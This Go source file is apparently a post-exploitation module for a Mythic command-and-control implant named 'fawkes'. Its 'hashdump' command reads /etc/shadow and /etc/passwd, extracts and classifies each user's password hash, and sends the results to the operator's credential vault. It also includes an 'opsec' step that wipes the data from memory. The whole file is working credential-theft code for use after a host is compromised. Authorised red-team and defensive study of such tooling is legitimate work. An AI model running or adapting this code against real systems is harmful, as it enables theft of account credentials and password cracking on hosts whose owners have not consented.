//go:build linux

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"fawkes/pkg/structs"
)

// HashdumpCommand extracts password hashes from /etc/shadow on Linux.
type HashdumpCommand struct{}

func (c *HashdumpCommand) Name() string { return "hashdump" }
func (c *HashdumpCommand) Description() string {
	return "Extract password hashes from /etc/shadow (requires root)"
}

type hashdumpLinuxArgs struct {
	Format string `json:"format"` // text (default) or json
}

// shadowEntry represents a parsed /etc/shadow line.
type shadowEntry struct {
	Username string `json:"username"`
	Hash     string `json:"hash"`
	HashType string `json:"hash_type"`
	UID      string `json:"uid,omitempty"`
	GID      string `json:"gid,omitempty"`
	Home     string `json:"home,omitempty"`
	Shell    string `json:"shell,omitempty"`
}

func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
	var args hashdumpLinuxArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Error parsing parameters: %v", err)
		}
	}

	// Read /etc/shadow
	shadowData, err := os.ReadFile("/etc/shadow")
	if err != nil {
		return errorf("Error reading /etc/shadow: %v (requires root)", err)
	}
	defer structs.ZeroBytes(shadowData)

	// Read /etc/passwd for UID/GID/home/shell context
	passwdData, err := os.ReadFile("/etc/passwd")
	if err != nil {
		passwdData = nil // non-fatal, just less context
	}
	defer structs.ZeroBytes(passwdData) // opsec: clear passwd data from memory

	passwdMap := parsePasswd(passwdData)

	// Parse shadow entries
	var entries []shadowEntry
	for _, line := range strings.Split(string(shadowData), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		fields := strings.SplitN(line, ":", 3)
		if len(fields) < 2 {
			continue
		}

		username := fields[0]
		hash := fields[1]

		// Skip accounts with no password or locked accounts
		if hash == "" || hash == "*" || hash == "!" || hash == "!!" {
			continue
		}

		entry := shadowEntry{
			Username: username,
			Hash:     hash,
			HashType: identifyHashType(hash),
		}

		if pw, ok := passwdMap[username]; ok {
			entry.UID = pw.uid
			entry.GID = pw.gid
			entry.Home = pw.home
			entry.Shell = pw.shell
		}

		entries = append(entries, entry)
	}

	if len(entries) == 0 {
		return successResult("No password hashes found in /etc/shadow")
	}

	if strings.ToLower(args.Format) == "json" {
		data, _ := json.Marshal(entries)
		return successResult(string(data))
	}

	// Text format (default) — mimics secretsdump.py style
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Dumping /etc/shadow — %d hashes found\n\n", len(entries)))

	// Report credentials to Mythic vault
	var creds []structs.MythicCredential

	for _, e := range entries {
		sb.WriteString(fmt.Sprintf("%s:%s\n", e.Username, e.Hash))
		if e.UID != "" || e.Shell != "" {
			sb.WriteString(fmt.Sprintf("  UID=%s GID=%s Home=%s Shell=%s Type=%s\n",
				e.UID, e.GID, e.Home, e.Shell, e.HashType))
		}

		creds = append(creds, structs.MythicCredential{
			CredentialType: "hash",
			Realm:          "local",
			Account:        e.Username,
			Credential:     e.Hash,
			Comment:        fmt.Sprintf("hashdump /etc/shadow (%s)", e.HashType),
		})
	}

	return structs.CommandResult{
		Output:      sb.String(),
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
}

// passwdEntry holds parsed /etc/passwd fields.
type passwdEntry struct {
	uid   string
	gid   string
	home  string
	shell string
}

// parsePasswd parses /etc/passwd into a map[username]passwdEntry.
func parsePasswd(data []byte) map[string]passwdEntry {
	m := make(map[string]passwdEntry)
	if data == nil {
		return m
	}
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Split(line, ":")
		if len(fields) < 7 {
			continue
		}
		m[fields[0]] = passwdEntry{
			uid:   fields[2],
			gid:   fields[3],
			home:  fields[5],
			shell: fields[6],
		}
	}
	return m
}

// identifyHashType determines the hash algorithm from the shadow hash prefix.
func identifyHashType(hash string) string {
	if strings.HasPrefix(hash, "$y$") {
		return "yescrypt"
	}
	if strings.HasPrefix(hash, "$6$") {
		return "SHA-512"
	}
	if strings.HasPrefix(hash, "$5$") {
		return "SHA-256"
	}
	if strings.HasPrefix(hash, "$2b$") || strings.HasPrefix(hash, "$2a$") || strings.HasPrefix(hash, "$2y$") {
		return "bcrypt"
	}
	if strings.HasPrefix(hash, "$1$") {
		return "MD5"
	}
	if strings.HasPrefix(hash, "!") || strings.HasPrefix(hash, "*") {
		return "locked"
	}
	if len(hash) == 13 {
		return "DES"
	}
	return "unknown"
}
